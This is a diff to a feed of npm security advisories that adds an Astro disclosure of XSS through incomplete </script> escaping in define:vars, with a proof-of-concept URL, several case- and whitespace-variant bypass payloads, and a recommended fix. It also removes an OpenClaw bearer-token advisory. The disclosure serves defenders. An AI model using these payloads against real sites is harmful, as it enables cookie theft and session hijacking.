@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-04-21T20:35:34.620Z</updated>
+    <updated>2026-04-21T21:25:40.468Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,112 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[astro] Astro: XSS in define:vars via incomplete </script> tag sanitization]]></title>
+        <id>https://github.com/advisories/GHSA-j687-52p2-xcff</id>
+        <link href="https://github.com/advisories/GHSA-j687-52p2-xcff"/>
+        <updated>2026-04-21T20:39:52.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>defineScriptVars</code> function in Astro's server-side rendering pipeline uses a case-sensitive regex <code>/&lt;\/script&gt;/g</code> to sanitize values injected into inline <code>&lt;script&gt;</code> tags via the <code>define:vars</code> directive. HTML parsers close <code>&lt;script&gt;</code> elements case-insensitively and also accept whitespace or <code>/</code> before the closing <code>&gt;</code>, allowing an attacker to bypass the sanitization with payloads like <code>&lt;/Script&gt;</code>, <code>&lt;/script &gt;</code>, or <code>&lt;/script/&gt;</code> and inject arbitrary HTML/JavaScript.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerable function is <code>defineScriptVars</code> at <code>packages/astro/src/runtime/server/render/util.ts:42-53</code>:</p>
+<pre><code class="language-typescript">export function defineScriptVars(vars: Record&lt;any, any&gt;) {
+    let output = '';
+    for (const [key, value] of Object.entries(vars)) {
+        output += `const ${toIdent(key)} = ${JSON.stringify(value)?.replace(
+            /&lt;\/script&gt;/g,       // ← Case-sensitive, exact match only
+            '\\x3C/script&gt;',
+        )};\n`;
+    }
+    return markHTMLString(output);
+}
+</code></pre>
+<p>This function is called from <code>renderElement</code> at <code>util.ts:172-174</code> when a <code>&lt;script&gt;</code> element has <code>define:vars</code>:</p>
+<pre><code class="language-typescript">if (name === 'script') {
+    delete props.hoist;
+    children = defineScriptVars(defineVars) + '\n' + children;
+}
+</code></pre>
+<p>The regex <code>/&lt;\/script&gt;/g</code> fails to match three classes of closing script tags that HTML parsers accept per the <a href="https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inbody">HTML specification §13.2.6.4</a>:</p>
+<ol>
+<li><strong>Case variations</strong>: <code>&lt;/Script&gt;</code>, <code>&lt;/SCRIPT&gt;</code>, <code>&lt;/sCrIpT&gt;</code> — HTML tag names are case-insensitive but the regex has no <code>i</code> flag.</li>
+<li><strong>Whitespace before <code>&gt;</code></strong>: <code>&lt;/script &gt;</code>, <code>&lt;/script\t&gt;</code>, <code>&lt;/script\n&gt;</code> — after the tag name, the HTML tokenizer enters the "before attribute name" state on ASCII whitespace.</li>
+<li><strong>Self-closing slash</strong>: <code>&lt;/script/&gt;</code> — the tokenizer enters "self-closing start tag" state on <code>/</code>.</li>
+</ol>
+<p><code>JSON.stringify()</code> does not escape <code>&lt;</code>, <code>&gt;</code>, or <code>/</code> characters, so all these payloads pass through serialization unchanged.</p>
+<p><strong>Execution flow:</strong> User-controlled input (e.g., <code>Astro.url.searchParams</code>) → assigned to a variable → passed via <code>define:vars</code> on a <code>&lt;script&gt;</code> tag → <code>renderElement</code> → <code>defineScriptVars</code> → incomplete sanitization → injected into <code>&lt;script&gt;</code> block in HTML response → browser closes the script element early → attacker-controlled HTML parsed and executed.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Step 1:</strong> Create an SSR Astro page (<code>src/pages/index.astro</code>):</p>
+<pre><code class="language-astro">---
+const name = Astro.url.searchParams.get('name') || 'World';
+---
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;Hello&lt;/h1&gt;
+  &lt;script define:vars={{ name }}&gt;
+    console.log(name);
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><strong>Step 2:</strong> Ensure SSR is enabled in <code>astro.config.mjs</code>:</p>
+<pre><code class="language-js">export default defineConfig({
+  output: 'server'
+});
+</code></pre>
+<p><strong>Step 3:</strong> Start the dev server and visit:</p>
+<pre><code>http://localhost:4321/?name=&lt;/Script&gt;&lt;img/src=x%20onerror=alert(document.cookie)&gt;
+</code></pre>
+<p><strong>Step 4:</strong> View the HTML source. The output contains:</p>
+<pre><code class="language-html">&lt;script&gt;const name = "&lt;/Script&gt;&lt;img/src=x onerror=alert(document.cookie)&gt;";
+  console.log(name);
+&lt;/script&gt;
+</code></pre>
+<p>The browser's HTML parser matches <code>&lt;/Script&gt;</code> case-insensitively, closing the script block. The <code>&lt;img onerror=alert(document.cookie)&gt;</code> is then parsed as HTML and the JavaScript in <code>onerror</code> executes.</p>
+<p><strong>Alternative bypass payloads:</strong></p>
+<pre><code>/?name=&lt;/script &gt;&lt;img/src=x onerror=alert(1)&gt;
+/?name=&lt;/script/&gt;&lt;img/src=x onerror=alert(1)&gt;
+/?name=&lt;/SCRIPT&gt;&lt;img/src=x onerror=alert(1)&gt;
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An attacker can execute arbitrary JavaScript in the context of a victim's browser session on any SSR Astro application that passes request-derived data to <code>define:vars</code> on a <code>&lt;script&gt;</code> tag. This is a documented and expected usage pattern in Astro.</p>
+<p>Exploitation enables:</p>
+<ul>
+<li><strong>Session hijacking</strong> via cookie theft (<code>document.cookie</code>)</li>
+<li><strong>Credential theft</strong> by injecting fake login forms or keyloggers</li>
+<li><strong>Defacement</strong> of the rendered page</li>
+<li><strong>Redirection</strong> to attacker-controlled domains</li>
+</ul>
+<p>The vulnerability affects all Astro versions that support <code>define:vars</code> and is exploitable in any SSR deployment where user input reaches a <code>define:vars</code> script variable.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Replace the case-sensitive exact-match regex with a comprehensive escape that covers all HTML parser edge cases. The simplest correct fix is to escape all <code>&lt;</code> characters in the JSON output:</p>
+<pre><code class="language-typescript">export function defineScriptVars(vars: Record&lt;any, any&gt;) {
+    let output = '';
+    for (const [key, value] of Object.entries(vars)) {
+        output += `const ${toIdent(key)} = ${JSON.stringify(value)?.replace(
+            /&lt;/g,
+            '\\u003c',
+        )};\n`;
+    }
+    return markHTMLString(output);
+}
+</code></pre>
+<p>This is the standard approach used by frameworks like Next.js and Rails. Replacing every <code>&lt;</code> with <code>\u003c</code> is safe inside JSON string contexts (JavaScript treats <code>\u003c</code> as <code>&lt;</code> at runtime) and eliminates all possible <code>&lt;/script&gt;</code> variants including case variations, whitespace, and self-closing forms.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-j687-52p2-xcff">https://github.com/withastro/astro/security/advisories/GHSA-j687-52p2-xcff</a></li>
+<li><a href="https://github.com/withastro/astro/releases/tag/astro@6.1.6">https://github.com/withastro/astro/releases/tag/astro@6.1.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-j687-52p2-xcff">https://github.com/advisories/GHSA-j687-52p2-xcff</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j687-52p2-xcff</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-21T20:39:49.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[flowise-components] Flowise: CSV Agent Prompt Injection Remote Code Execution Vulnerability]]></title>
         <id>https://github.com/advisories/GHSA-3hjv-c53m-58jj</id>
@@ -1400,48 +1506,5 @@ json.dumps(my_dict)`
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-04-17T22:32:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Gateway HTTP endpoints re-resolve bearer auth after SecretRef rotation]]></title>
-        <id>https://github.com/advisories/GHSA-xmxx-7p24-h892</id>
-        <link href="https://github.com/advisories/GHSA-xmxx-7p24-h892"/>
-        <updated>2026-04-17T22:32:04.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Gateway HTTP and WebSocket handlers captured the resolved bearer-auth configuration when the server started. After a SecretRef rotation, the already-running gateway could continue accepting the old bearer token until restart.</p>
-<h2 id="impact">Impact</h2>
-<p>A bearer token that should have been revoked by SecretRef rotation could remain valid on the gateway HTTP and upgrade surfaces for the lifetime of the process. Severity remains high because the old token could continue to authorize gateway requests after operators believed it was rotated out.</p>
-<h2 id="affected-versions">Affected versions</h2>
-<ul>
-<li>Affected: <code>&lt; 2026.4.15</code></li>
-<li>Patched: <code>2026.4.15</code></li>
-</ul>
-<h2 id="fix">Fix</h2>
-<p>OpenClaw <code>2026.4.15</code> resolves active gateway auth from the runtime secret snapshot per request and per upgrade instead of using a stale startup-time value.</p>
-<p>Verified in <code>v2026.4.15</code>:</p>
-<ul>
-<li><code>src/gateway/server.impl.ts</code> exposes <code>getResolvedAuth()</code> backed by the current runtime secret snapshot.</li>
-<li><code>src/gateway/server-http.ts</code> calls <code>getResolvedAuth()</code> for each HTTP request and WebSocket upgrade before running auth checks.</li>
-<li><code>src/gateway/server-http.probe.test.ts</code> verifies <code>/ready</code> re-resolves bearer auth after rotation and rejects the old token.</li>
-</ul>
-<p>Fix commit included in <code>v2026.4.15</code> and absent from <code>v2026.4.14</code>:</p>
-<ul>
-<li><code>acd4e0a32f12e1ad85f3130f63b42443ce90f094</code> via PR #66651</li>
-</ul>
-<p>Thanks to @zsxsoft, Keen Security Lab, and @qclawer for reporting this issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-xmxx-7p24-h892">https://github.com/openclaw/openclaw/security/advisories/GHSA-xmxx-7p24-h892</a></li>
-<li><a href="https://github.com/openclaw/openclaw/pull/66651">https://github.com/openclaw/openclaw/pull/66651</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/acd4e0a32f12e1ad85f3130f63b42443ce90f094">https://github.com/openclaw/openclaw/commit/acd4e0a32f12e1ad85f3130f63b42443ce90f094</a></li>
-<li><a href="https://github.com/advisories/GHSA-xmxx-7p24-h892">https://github.com/advisories/GHSA-xmxx-7p24-h892</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xmxx-7p24-h892</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-17T22:32:02.000Z</published>
     </entry>
 </feed>
